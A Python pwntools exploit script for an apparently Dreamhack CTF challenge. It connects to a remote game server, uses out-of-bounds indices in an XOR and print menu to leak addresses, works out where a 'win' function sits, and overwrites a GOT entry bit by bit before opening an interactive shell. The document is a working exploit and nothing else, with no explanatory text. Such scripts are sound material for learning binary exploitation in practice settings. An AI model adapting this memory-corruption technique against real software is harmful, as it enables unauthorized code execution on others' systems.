from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 13467
r = remote(HOST, PORT)

def prnt(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(idx).encode())
def xor(i, j):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', ('%d %d'%(i,j)).encode())

xor(0, -7)
prnt(0)
r.recvuntil(b'Value: ')
arr = int(r.recvline().decode().strip(),16)+0x38-1
win = arr-0x20d3
xor(0,-7)

xor(0, -19)
prnt(0)
r.recvuntil(b'Value: ')
puts_leak = int(r.recvline().decode().strip(),16)-1
xor(0, -19)
mask=win^puts_leak

lst = [1 << i for i in range(64)]
i=len(lst)-1
bits=[]
while mask != 0:
    if mask-lst[i] >= 0:
        mask -= lst[i]
        bits.append(i)
    i-=1

for i in range(len(bits)-1):
    xor(bits[-1], bits[i])

xor(-19, bits[-1])
r.interactive()
